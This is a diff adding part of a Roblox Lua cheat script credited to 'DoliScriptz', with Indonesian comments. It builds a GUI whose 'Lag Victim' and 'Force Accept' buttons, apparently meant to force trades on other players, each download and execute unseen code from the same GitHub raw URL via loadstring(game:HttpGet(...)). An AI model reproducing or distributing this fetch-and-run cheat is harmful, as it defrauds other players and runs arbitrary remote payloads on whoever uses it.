@@ -1,0 +1,55 @@
+button2.Font = Enum.Font.SourceSans
+button2.TextSize = 24
+button2.Parent = frame
+
+-- Menambahkan Text untuk Credits
+local credits = Instance.new("TextLabel")
+credits.Name = "Credits"
+credits.Size = UDim2.new(1, 0, 0.1, 0)
+credits.Position = UDim2.new(0, 0, 0.8, 0)
+credits.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+credits.TextColor3 = Color3.fromRGB(255, 255, 255)
+credits.Text = "Made By DoliScriptz"
+credits.Font = Enum.Font.SourceSans
+credits.TextSize = 18
+credits.Parent = frame
+
+-- Fungsi untuk membuat notifikasi
+local function showNotification(text)
+local notification = Instance.new("TextLabel")
+notification.Name = "Notification"
+notification.Size = UDim2.new(0.3, 0, 0.1, 0)
+notification.Position = UDim2.new(0.35, 0, 0.1, 0)
+notification.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+notification.TextColor3 = Color3.fromRGB(255, 255, 255)
+notification.Text = text
+notification.Font = Enum.Font.SourceSansBold
+notification.TextSize = 20
+notification.Parent = screenGui
+wait(3)
+notification:Destroy()
+end
+
+-- Fungsi untuk mengeksekusi script dari URL
+local function executeScript(url)
+local success, errorMsg = pcall(function()
+loadstring(game:HttpGet(url, true))()
+end)
+if not success then
+showNotification("Error: " .. errorMsg)
+else
+showNotification("Script Executed")
+end
+end
+
+-- Menambahkan event untuk tombol pertama "Lag Victim"
+button1.MouseButton1Click:Connect(function()
+showNotification("Lag Victim Executed")
+executeScript("https://raw.githubusercontent.com/DoliScriptz/TradeStart/main/Second")
+end)
+
+-- Menambahkan event untuk tombol kedua "Force Accept"
+button2.MouseButton1Click:Connect(function()
+showNotification("Force Accept Executed")
+executeScript("https://raw.githubusercontent.com/DoliScriptz/TradeStart/main/Second")
+end)
